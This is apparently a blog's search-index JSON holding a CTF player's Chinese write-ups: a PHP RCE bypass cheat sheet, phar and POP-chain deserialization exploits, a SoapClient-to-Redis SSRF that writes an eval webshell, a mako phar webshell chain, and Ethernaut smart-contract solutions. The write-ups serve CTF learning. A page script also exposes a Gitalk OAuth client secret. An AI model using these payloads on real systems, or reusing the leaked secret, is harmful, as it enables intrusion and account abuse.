{"pages":[{"title":"","text":"你似乎来到了世界的尽头","link":"/album/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"🚩 A CTFer 💖 ACGN 🖥️ Web 2.0 &amp; Web .03 🪗 Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Username这不得不得提起我的高中生活了。高一军训的时候，教官叫我小胖，于是我同学就开始叫我阿胖。我的高中英语老师普通话不标准，掺杂着一股浓烈的方言味道，甚至英文单词都有一股浓烈的“地方特色”，有一天，他读课文，兴致正浓，刚好读到了一句话，恰巧这句话里又有一个upon，而这个upon他又专门停顿一下，重(zhong)读。当时，一股雄厚无比而又夹杂着方言味道的声浪袭来，之后我同学都管我叫upon了。 至于后面的数字，俺比较懒，哪年注册的后面就写的哪年，当然也有特例，就是2016，这个代表的不是2016年，而是指比特币每2016个区块会变更一次挖矿难度，在一些与区块链有关的社区，我注册的id大多是UPON-2016","link":"/about/index.html"},{"title":"","text":"友情链接还在添加中qwq 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"","text":"[Week1]calc_jail_beginner_level2.5(JAIL)12345678910111213141516171819202122232425262728293031323334353637#the length is be limited less than 13#it seems banned some payload #banned some unintend sol#Can u escape it?Good luck!def filter(s): BLACKLIST = [&quot;exec&quot;,&quot;input&quot;,&quot;eval&quot;] for i in BLACKLIST: if i in s: print(f'{i!r} has been banned for security reasons') exit(0)WELCOME = ''' _ _ _ _ _ _ _ ___ _____ | | (_) (_) (_) | | | |__ \\ | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | ) | | |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ | / / |___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |/ /_ _ ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____(_)____/ __/ | _/ | |___/ |__/ '''print(WELCOME)print(&quot;Welcome to the python jail&quot;)print(&quot;Let's have an beginner jail of calc&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)input_data = input(&quot;&gt; &quot;)filter(input_data)if len(input_data)&gt;13: print(&quot;Oh hacker!&quot;) exit(0)print('Answer: {}'.format(eval(input_data))) Unicode 欺骗https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E6%9E%81%E7%AB%AF%E9%99%90%E5%88%B6好棒的博客 [WEEK2]calc_jail_beginner_level5(JAIL)1#It\\'s an challenge for jaillevel5 let\\'s read your flag!\\nimport load_flag\\n\\nflag = load_flag.get_flag()\\n\\ndef main():\\n WELCOME = \\'\\'\\'\\n _ _ _ _ _ _ _ _____ \\n | | (_) (_) (_) | | | | ____|\\n | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | |__ \\n | \\'_ \\\\ / _ \\\\/ _` | | \\'_ \\\\| \\'_ \\\\ / _ \\\\ \\'__| | |/ _` | | | |/ _ \\\\ \\\\ / / _ \\\\ |___ \\\\ \\n | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\\\ V / __/ |___) |\\n |_.__/ \\\\___|\\\\__, |_|_| |_|_| |_|\\\\___|_| | |\\\\__,_|_|_|_|\\\\___| \\\\_/ \\\\___|_|____/ \\n __/ | _/ | \\n |___/ |__/ \\n\\'\\'\\'\\n print(WELCOME)\\n print(&quot;It\\'s so easy challenge!&quot;)\\n print(&quot;Seems flag into the dir()&quot;)\\n repl()\\n\\n\\ndef repl():\\n my_global_dict = dict()\\n my_global_dict[\\'my_flag\\'] = flag\\n input_code = input(&quot;&gt; &quot;)\\n complie_code = compile(input_code, \\'&lt;string&gt;\\', \\'single\\')\\n exec(complie_code, my_global_dict)\\n\\nif __name__ == \\'__main__\\':\\n main()","link":"/2022/10/12/HNctf/"},{"title":"命令执行备忘录","text":"0x00 什么是RCERCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 0x01 常见命令执行函数12PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()... 12PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()... 0x02 Bypass1.关键词拦截: 关键词替换为空的情况: 双写绕过，比如cacatt -&gt; cat 仅拦截关键字: 使用其他函数，比如拦截cat的时候，可以使用其他命令。 Input Ouput static-sh ./flag.txt ./flag.txt: line 1: flag{this_is_a_test}: not found paste ./flag.txt /etc/passwd flag{this_is_a_test} root:x:0:0:root:/root:/bin/bash… diff diff ./flag.txt /etc/passwd curl file:///home/coffee/flag flag{this_is_a_test} … … 通配符绕过，比如可以使用/b??/c?t f*。该方法有时候会因为输出过多或者运行时间超出限制被强行中断 插入&quot;&quot; &lt;&gt; '' \\绕过,比如ca''t flag.txt或者ca\\t flag.txt 内联执行，将反引号内命令的输出作为输入执行,如: cat `ls`，或者是cat ${ls} 使用变量替换，如$c=a;cat fl$cg.php 拦截空格,空格可以用以下字符串代替： &lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等，比如: 123456cat%09flag{cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt .操作符 eval函数中用.把被拦截的关键字给分开，比如 12&lt;?php eval(include &quot;/www/lo&quot;.&quot;g/nginx/access.log&quot;); 逃逸，绕过太难了，直接润出来比如 12c=include$_GET[1]?&gt; c=eval($_GET[1]) 借壳生蛋 12345678&lt;?php $env = $_GET['env']; if(isset($env)){ putenv($env); system(&quot;whoami&quot;); }else{ highlight_file(__FILE__); } ?env=BASH_FUNC_whoami%%=() { ls; }whoami是system(“whoami”)启动的bash环境的函数，相当于我们注册了一个whoami替换它 构造 在PHP7中，可以这样调用函数: 123('phpinfo')();$a = &quot;phpinfo&quot;;$$a;... 然后就可以使用异或^,取反~，自增++，自减--等方法构造想要的字符然后进行动态函数调用。 构造字符的时候，可以利用一些PHP的特性： PHP中的NAN和INF： 123456NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。$_=C/C;//NAN$_=1/C//INF 2.无回显 利用sleep()之类的函数来根据服务器响应的时间一个一个字符获获取注:该方法局限性很大，且容易受到网络波动影响，不建议优先考虑使用 利用dns外带http://dnslog.cn/注:该方法也有一定的局限性，有长度限制而且不支持特殊字符 利用重定向，将输出重定向到可访问网页中 反弹shell如果题目不出网只能寄 命令注入,尝试在命令后面加上||、%0a、%0d、|、;、&amp;等符号将原先重定向到/dev/null的命令分割开 3.include 伪协议 日志包含UA写马,包含access.log allow_url_include=ture可以使用的data123456789101112131415data类型扩展: data类型扩展 data:,&lt;文本数据&gt; data:text/plain,&lt;文本数据&gt; data:text/html,&lt;HTML代码&gt; data:text/html;base64,&lt;base64编码的HTML代码&gt; data:text/css,&lt;CSS代码&gt; data:text/css;base64,&lt;base64编码的CSS代码&gt; data:text/javascript,&lt;Javascript代码&gt; data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 Tips: PHP具有极强的鲁棒性特别耐操，尤其是伪协议这块。1234567原payload:php://filter/convert.base64-encode/resource=index.php我可以插♂ 入一些奇怪的东西php://filter/convert.base64-encode/114514/resource=index.php我可以大大小小php://FiLTer/convert.base64-encode/resource=index.php 4.无参命令执行这种就基本没活能整了，已经十分固定下来了 123456&lt;?phphighlight_file(__FILE__);if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);}?&gt; '/[^\\W]+\\((?R)?\\)/'的解释 这里使用pregreplace替换匹配到的字符为空，\\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有; 以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。 一些有用的东西 12345678910111213141516171819202122目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件 PAYLOAD 请求头 123GET /1.php?code=eval(end(getallheaders())); HTTP/1.1.....flag: system('id'); get_defined_vars() 1?code=eval(end(current(get_defined_vars())));&amp;flag=system('ls'); 利用全局变量进RCE get_defined_vars()：返回由所有已定义变量所组成的数组，会返回 _GET,_POST, _COOKIE, _FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;filescurrent：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值 3.session_start() session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id() session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。文件读取 show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))) highlight_file(session_id(session_start())); readfile(session_id(session_start()));抓包传入Cookie: PHPSESSID=(想读的文件)即可","link":"/2022/10/03/RCE/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"},{"title":"Round 6复现","text":"Web check(V1)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from flask import Flask,requestimport tarfileimport osapp = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['tar'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/')def index(): with open(__file__, 'r') as f: return f.read()@app.route('/upload', methods=['POST'])def upload_file(): if 'file' not in request.files: return '?' file = request.files['file'] if file.filename == '': return '?' print(file.filename) if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename: file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a tarfile' try: tar = tarfile.open(file_save_path, &quot;r&quot;) tar.extractall(app.config['UPLOAD_FOLDER']) except Exception as e: return str(e) os.remove(file_save_path) return 'success'@app.route('/download', methods=['POST'])def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' with open(filepath, 'r') as f: return f.read() @app.route('/clean', methods=['POST'])def clean_file(): os.system('/tmp/clean.sh') return 'success'if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) 管他那么多，先整一个上传页面 1234&lt;form id=&quot;upload-form&quot; action=&quot;http://1.14.71.254:28597/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload&quot; name=&quot;upload&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;","link":"/2022/10/18/Round6/"},{"title":"DasCTF 十月月赛复现","text":"寄寄寄！四道题，三道我不擅长的反序列化，寄，当时还要考试复习，结果没太多时间做，麻了都。 EasyPop这题链子好找，也很快就找到了，但问题就在于最后一步如何绕过__wakeup，麻了，我就卡在这里了…….PHP序列化冷知识 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?phphighlight_file(__FILE__);error_reporting(0);class fine{private $cmd;private $content;public function __construct($cmd, $content){$this-&gt;cmd = $cmd;$this-&gt;content = $content;}public function __invoke(){call_user_func($this-&gt;cmd, $this-&gt;content);}public function __wakeup(){$this-&gt;cmd = &quot;&quot;;die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);}}class show{public $ctf;public $time = &quot;Two and a half years&quot;;public function __construct($ctf){$this-&gt;ctf = $ctf;}public function __toString(){return $this-&gt;ctf-&gt;show();}public function show(): string{return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;}}class sorry{private $name;private $password;public $hint = &quot;hint is depend on you&quot;;public $key;public function __construct($name, $password){$this-&gt;name = $name;$this-&gt;password = $password;}public function __sleep(){$this-&gt;hint = new secret_code();}public function __get($name){$name = $this-&gt;key;$name();}public function __destruct(){if ($this-&gt;password == $this-&gt;name) {echo $this-&gt;hint;} else if ($this-&gt;name = &quot;jay&quot;) {secret_code::secret();} else {echo &quot;This is our code&quot;;}}public function getPassword(){return $this-&gt;password;}public function setPassword($password): void{$this-&gt;password = $password;}}class secret_code{protected $code;public static function secret(){include_once &quot;hint.php&quot;;hint();}public function __call($name, $arguments){$num = $name;$this-&gt;$num();}private function show(){return $this-&gt;code-&gt;secret;}}if (isset($_GET['pop'])) {$a = unserialize($_GET['pop']);$a-&gt;setPassword(md5(mt_rand()));} else {$a = new show(&quot;Ctfer&quot;);echo $a-&gt;show();} hade_waibo进来一看，cancan need任意文件读取，把文件全扒下来，核心实在class.php里面，肯定是phar反序列化。乍一看，又要绕wakeup，不过这一次有引用赋值，可以绕，当时没时间了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phpclass User{ public $username; public function __construct($username){ $this-&gt;username = $username; $_SESSION['isLogin'] = True; $_SESSION['username'] = $username; } public function __wakeup(){ $cklen = strlen($_SESSION[&quot;username&quot;]); if ($cklen != 0 and $cklen &lt;= 6) { $this-&gt;username = $_SESSION[&quot;username&quot;]; } } public function __destruct(){ if ($this-&gt;username == '') { session_destroy(); } }}class File{ #更新黑名单为白名单，更加的安全 public $white = array(&quot;jpg&quot;,&quot;png&quot;); public function show($filename){ echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\\'file.php?m=show&amp;filename=\\'+document.getElementById(\\'filename\\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;'; if(empty($filename)){die();} return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;'; } public function upload($type){ $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename); return &quot;Upload success! Path: upload/&quot; . $filename; } public function rmfile(){ system('rm -rf /var/www/html/upload/*'); } public function check($type){ if (!in_array($type,$this-&gt;white)){ return false; } return true; }}#更新了一个恶意又有趣的Test类class Test{ public $value; public function __destruct(){ chdir('./upload'); $this-&gt;backdoor(); } public function __wakeup(){ $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;; } public function __toString(){ $file = substr($_GET['file'],0,3); file_put_contents($file, &quot;Hack by $file !&quot;); return 'Unreachable! :)'; } public function backdoor(){ if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){ $this-&gt;value = 'nono~'; } system($this-&gt;value); }} 官方exp 123456789101112131415161718192021222324class User{public $username;}class Test{public $value;}$User = new User();$Test = new Test();$User-&gt;a = $Test;$User-&gt;username = &amp;$Test-&gt;value;echo serialize($User);#第二步，需要把name改成* /*// $Test-&gt;a = $User;// $User-&gt;username = $Test;// echo serialize($Test);#第一步，需要把名字改成数组$phar = new \\Phar(&quot;h3ne1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt; addFromString('test.txt','h3en1');//$phar-&gt;setMetadata($Test);第一步$phar-&gt;setMetadata($User);$phar-&gt;stopBuffering(); 因为给实验室的新生配web靶机的docker环境，当时就顺手看看有没有start.sh或者flag.sh文件，然后就还真找到了 事实证明，docker运行之后，要删除的不只有环境变量，还有运行的sh脚本，谨防露牛子 start.sh 1234567#!/bin/shecho $FLAG &gt; /ghjsdk_F149_H3re_asdasfcexport FLAG=no_flagFLAG=no_flagapache2-foregroundrm -rf /flag.shtail -f /dev/null 直接露牛子了吧 EasyLove当时急着复习，这题我没看了….寄 123456789101112131415161718192021222324252627282930313233343536 &lt;?phphighlight_file(__FILE__);error_reporting(0);class swpu{ public $wllm; public $arsenetang; public $l61q4cheng; public $love; public function __construct($wllm,$arsenetang,$l61q4cheng,$love){ $this-&gt;wllm = $wllm; $this-&gt;arsenetang = $arsenetang; $this-&gt;l61q4cheng = $l61q4cheng; $this-&gt;love = $love; } public function newnewnew(){ $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng); } public function flag(){ $this-&gt;love-&gt;getflag(); } public function __destruct(){ $this-&gt;newnewnew(); $this-&gt;flag(); }}class hint{ public $hint; public function __destruct(){ echo file_get_contents($this-&gt; hint.'hint.php'); }}$hello = $_GET['hello'];$world = unserialize($hello); 这回链子很短，先看hint 1234567&lt;?phpclass hint{public $hint=&quot;php://filter/read=convert.base64-encode/resource=&quot;;}$a = new hint();echo serialize($a);?&gt; 获得账号密码 123&lt;?php$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;? 很明显，利用SoapClient进行ssrf然后打redis 寄，还是不会这里也看一下怎么打redis 这里比较有趣的是，当我们利用ssrf向redis发起http请求时，低版本的Redis会将请求头的内容作为redis命令解析，那么只要我们通过CRLF控制住请求头，再配合SoapClient发起请求即可，故exp如下： 12345678910111213141516171819202122&lt;?php$target='http://127.0.0.1:6379/';$poc0=&quot;AUTH 20220311&quot;;$poc=&quot;CONFIG SET dir /var/www/html&quot;;$poc1=&quot;SET x '&lt;?@eval(\\$_POST[1]);?&gt;'&quot;;$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;$poc3=&quot;SAVE&quot;;$a = array('location' =&gt; $target,'uri' =&gt;'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');$aaa = serialize($a);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$c=unserialize($aaa);class swpu{public $wllm = 'SoapClient';public $arsenetang = null;public $l61q4cheng;public $love;}$a=new swpu();$a-&gt;l61q4cheng=$c;echo urlencode(serialize($a));?&gt; 确实要学学Redis咋用了，这都看不懂 BlogSystem这是个好题，我慢慢品一品再来做,太多涉及到我知识盲区的东西了","link":"/2022/10/28/das10%E5%A4%8D%E7%8E%B0/"},{"title":"美团CTF决赛复现 mako","text":"太菜了，被大佬带进决赛了,最后就签个到 环境密码:1skr 下面部分是我在比赛的时候思考过的 1.开始页面一进来，十分的清爽，毛都没有，就一个上传文件的东西 随便传点东西，发现是来者不拒，啥都能传，但啥都干不了访问1.php只会出现404not found这是最令人异或的一点 因为题目给了docker，就本地部署一个环境，先进去看看文件都存到了哪里可以看见，文件并没有被上传到/var/www/html/这个目录下面 而文件被上传到了/var/www/html/mako/uploads这个目录下 可以肯定的是，文件上传是整不了活了 2.审计通过搜索关键词，在mako/app/reources/views/home.tpl.php里找到到了首页的源码 很明显，这是用模版渲染出来的主页, 图片都是以base64的编码形式传递的，没活整了。 这就很令人苦恼，我当时尝试了一下，使用软链接 直接寄了，没权限，这时候才想起来容器一开始写了一个读取flag的程序 目标也明确了，肯定得想办法执行readFlag，于是我搜了危险函数，然后是一无所获，要么没这个函数，要么根本无法触发 做到这里，我已经没有思路了，当时想到了反序列化，但是只知道搜unseralize，结果是毛都没搜到。 我经验太少了，当时没想到用phar 3.复现在mako/app/controllers/ImagesController.php文件中 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} 可以看到，文件名是不做任何过滤的 而在mako/vendo/mako/framework/src/mako/pixl/image.php中 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} 使用了能触发phar反序列化的file_exists函数 关键函数找到了，现在找链子吧 搜索__destruct(),干扰项不多，可以直接开撸 好家伙，我直接好家伙，一条龙服务了属于是qwq 4.攻击这里搬一手Arr3stY0u战队的poc吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; 上传文件getshellflag is here 5.总结反思经验不足，做题不够，欠练","link":"/2022/09/30/mt-ctf/"},{"title":"Ethernaut刷题记录","text":"踩坑记录来自这里 可见修饰符publicprivateethernaut0.注意事项 @openzeppelin/contracts/math/SafeMath.sol 的地址已经迁移，做这个靶场的时候得自己手动改成&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; 以太坊主网即将进行合并，Rinkeby测试网络将于一年后停止运行，到时候就不知道这个靶场是否还会继续运行 不同版本的solidity语言特性不一样，可能会有兼容问题 Rinkeby的测试以太难以大量获取，做题不要一股脑把以太全塞进去了 1.Fallout描述12345678910111213这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?实际上... 也未必.Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 'Dynamic Pyramid' 改成 'Rubixi' 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ...这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的. 合约代码12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }} 解:扔到remix里面调用Fal1out()函数就行了 2.Coin Flip描述这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。 合约代码123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }} 解:以太坊网络经典难题:熵的产生 使用区块哈希产生的随机数很容易被预测(只需要和它在同一个区块上就行了)，只需要写个中继合约打进去就行了（原来的合约基础之上改一点点就行了） 1234567891011121314function exp() public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; c = CoinFlip(targetAddress); c.flip(side);} 注意：在某些预测随机数的题目中会返还以太，经常出现合约逻辑没有任何问题，但是就是运行出错的问题。 当合约收到一个calldata为空的call时，receive函数会被调用。这个函数会在执行一些以太币转账操作时被执行，常见的以太币转账操作包括.send()、.transfer()函数发起的转账。如果没有receive函数存在，但是存在一个payable属性的fallback函数的话，这个fallback函数会在一次以太币转账中被调用。如果一个合约既没有receive函数也没有payable属性的fallback函数，那么这个合约不能通过常规的交易来接收以太币，并且会抛出一个异常。 3.Telephone合约代码12345678910111213141516pragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }} 解:tx.orgin指的是交易的发起方，msg.sender是直接调用的一方，所以直接写合约调用这个函数就行了 123456789101112131415161718192021pragma solidity ^0.4.11;interface Telephone { function changeOwner(address _owner) external;}contract exploit { address targetAddr; Telephone t; address myaddr; function setInstance(address _targetAddr,address _myaddr) public { targetAddr=_targetAddr; myaddr= _myaddr; } function exp () public { t = Telephone(targetAddr); t.changeOwner(myaddr); }} 4.Token合约代码1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }} 解:很easy 溢出就完事了转个 115792089237316195423570985008687907853269984665640564039457584007913129639935就行了 5. Delegation合约代码123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }} 解：老生常谈， delegatecall相当于是去目标合约那块把相关的函数代码复制过来运行，而在solidity是个编译型语言，且存储使用的是slot[]这个大数组，变量是写死在代码里面的，一旦目标合约的变量环境和当前合约的变量环境不一样，就出大事，这题都做烂了，懒得写了 6.Force描述123有些合约就是拒绝你的付款,就是这么任性 ¯\\_(ツ)_/¯这一关的目标是使合约的余额大于0 合约代码123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m)*/} 